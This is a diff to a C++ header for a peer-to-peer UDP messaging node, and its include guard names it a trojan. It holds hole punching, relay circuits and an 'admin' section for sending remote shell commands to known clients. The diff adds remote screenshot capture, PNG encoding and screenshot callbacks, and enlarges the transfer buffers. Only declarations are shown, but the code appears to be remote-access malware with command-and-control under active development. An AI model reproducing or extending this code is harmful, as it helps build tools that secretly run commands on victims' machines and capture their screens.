@@ -29,7 +29,8 @@ constexpr int ROOT_PORT = 12345;
 constexpr int MIN_RELAYS = 1;
 constexpr int MAX_RELAYS = 4;
 constexpr int MIN_GRAPH_SIZE = 2; // minimum nodes in local graph to attempt circuit building
-constexpr size_t CHUNK_SIZE = 900;
+constexpr size_t CHUNK_SIZE = 1600;
+constexpr auto   chunk_send_interval_ms = std::chrono::milliseconds(1);
 
 using udp = asio::ip::udp;
 using MsgType = proto::MsgType;
@@ -89,6 +90,7 @@ struct OutgoingTransfer {
     ContentType content_type;
     uint32_t total_chunks;
     std::vector<std::vector<uint8_t>> chunks; // chunks[i] = raw bytes of chunk i
+    std::string circuit_id; // non-empty for reply transfers — use send_reply_via_circuit
 };
 
 bool operator==(proto::MsgType msg, char* str);
@@ -164,7 +166,13 @@ public:
     //ADMIN
     std::vector<ShellOut> take_shell_outs();
     void send_shell_cmd(std::string cmd, NodeId to);
+
+    void send_scrsht_cmd(NodeId to);
+
     void set_shell_out_callback(std::function<void(ShellOut)> cb);
+
+    void set_scrsht_out_callback(std::function<void(std::vector<uint8_t>)> cb);
+
     std::vector<NodeId> get_known_clients() const;
     bool has_ready_circuit(const NodeId& dst) const;
     void set_admin();
@@ -230,6 +238,8 @@ private:
     void punch(const std::string& peerId, int timeout, int punch_ms);
 
     void send_chunked(const NodeId &dst, std::vector<uint8_t> data, ContentType content_type);
+
+    void schedule_chunk_sender(std::string transfer_id, uint32_t index);
 
     void on_linkup(const udp::endpoint &from, const proto::Envelope &env);
 
@@ -317,7 +327,13 @@ private:
     void on_you_are_heir(const udp::endpoint& from, const proto::Envelope& env);
     void on_new_root(const udp::endpoint& from, const proto::Envelope& env);
 
-// -------------------------- Attributes --------------------------
+    // -------------------------- Admin Capabilities --------------------------
+
+    std::vector<uint8_t> take_screenshot(int &out_w, int &out_h);
+
+    std::vector<uint8_t> to_png(const std::vector<uint8_t> &bit_data, int w, int h);
+
+    // -------------------------- Attributes --------------------------
     std::string ip_;
     uint16_t port_;
     udp::endpoint ep_;
@@ -334,7 +350,7 @@ private:
     udp::socket socket_;
     udp::endpoint remote_;
     bool recv_;
-    std::array<char, 16384> recv_buf_{};
+    std::array<char, 65536> recv_buf_{};
 
     NodeId daddy_; // parent node
 
@@ -352,6 +368,7 @@ private:
     std::unordered_map<std::string, std::unique_ptr<Connection>> connections_;
 
     std::unordered_map<std::string, TokenEntry> token_cache_; // key=token
+    std::unordered_map<std::string, Clock::time_point> seen_introduce_ids_; // tx → time, for flood dedup
 
     std::unordered_map<NodeId, uint64_t> graph_seq_;  // dedup: node_id → last seq seen
     std::unordered_map<NodeId, uint64_t> graph_seq_out_; // root only: per-node broadcast counter
@@ -390,8 +407,11 @@ private:
     bool is_admin_;
     Shell shell_;
     std::mutex shell_mutex_;
+    std::mutex scrsht_mutex_;
     std::vector<ShellOut> shell_outs_;
+    std::vector<std::vector<uint8_t>> scrsht_outs_;
     std::function<void(ShellOut)> shell_out_cb_;
+    std::function<void(std::vector<uint8_t>)> scrsht_out_cb_;
 };
 
 #endif //TROJAN_MESSAGE_NODE_H
